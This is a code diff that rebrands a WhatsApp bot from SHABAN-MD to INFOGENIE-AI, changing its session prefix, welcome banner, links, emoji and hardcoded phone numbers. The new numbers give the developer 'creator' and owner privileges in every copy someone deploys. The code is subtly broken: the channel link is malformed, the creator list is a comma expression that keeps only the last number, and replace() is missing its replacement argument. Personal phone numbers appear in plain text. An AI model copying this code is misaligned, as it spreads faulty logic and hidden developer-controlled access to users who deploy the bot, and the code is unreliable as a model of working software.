@@ -67,7 +67,7 @@ const {
   //===================SESSION-AUTH============================
 if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
 if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
-const sessdata = config.SESSION_ID.replace("SHABAN-MD~", '');
+const sessdata = config.SESSION_ID.replace("Pkdriller~", '');
 const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
 filer.download((err, data) => {
 if(err) throw err
@@ -112,23 +112,23 @@ const port = process.env.PORT || 9090;
   console.log('Plugins installed successful ✅')
   console.log('Bot connected to whatsapp ✅')
   
-  let up = `*✨ Hello, SHABAN-MD Legend! ✨*
+  let up = `*✨ Hello, INFOGENI-AI Legend! ✨*
 
-╭─〔 *🤖 SHABAN-MD BOT* 〕  
+╭─〔 *🤖 INFOGENIE-AI BOT* 〕  
 ├─▸ *Simplicity. Speed. Power!*  
-╰─➤ *Your New WhatsApp Sidekick is Here!*
+╰─➤ *Your New WhatsApp assistant is Here!*
 
-*❤️ Thank you for Choosing SHABAN-MD!*
+*❤️ Thank you for Choosing INFOGENI-AI!*
 
 ╭──〔 🔗 *Quick Links* 〕  
 ├─ 📢 *Join Our Channel:*  
-│   Click [**Here**](https://whatsapp.com/channel/0029VazjYjoDDmFZTZ9Ech3O) to join!  
+│   Click [**Here**](https://whatsapp.com/channel/0029Vad7YNyJuyA77CtIPX0x!  
 ├─ ⭐ *Give Us a Star:*  
-│   Star Us [**Here**](https://github.com/MRSHABAN40/SHABAN-MD-V5)!  
+│   Star Us [**Here**](https://github.com/pkdriller/INFOGENIE-AI)!  
 ╰─🛠️ *Prefix:* \`${prefix}\`
 
-> _© MADE BY MR SHABAN_`;
-    conn.sendMessage(conn.user.id, { image: { url: `https://i.ibb.co/RK56DRW/shaban-md.jpg` }, caption: up })
+> _© MADE BY MR PKDRILLER_`;
+    conn.sendMessage(conn.user.id, { image: { url: `https://i.ibb.co/0jNnSxm4/nexus-xmd.jpg` }, caption: up })
   }
   })
   conn.ev.on('creds.update', saveCreds)
@@ -177,7 +177,7 @@ const port = process.env.PORT || 9090;
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
   const user = mek.key.participant
   const text = `${config.AUTO_STATUS_MSG}`
-  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
+  await conn.sendMessage(user, { text: text, react: { text: '🖤', key: mek.key } }, { quoted: mek })
             }
             await Promise.all([
               saveMessage(mek),
@@ -213,7 +213,7 @@ const port = process.env.PORT || 9090;
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const jawad = ('923470027813', '923191089077', '923146190772');
+    const jawad = ('254785392165', '254736761160', '254799056874');
     let isCreator = [udp, jawad, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
 					.includes(mek.sender);
@@ -260,7 +260,7 @@ const port = process.env.PORT || 9090;
 				}
  //================ownerreact==============
     
-  if(senderNumber.includes("923043788282")){
+  if(senderNumber.includes("254785392165")){
   if(isReact) return
   m.react("🪀")
    }
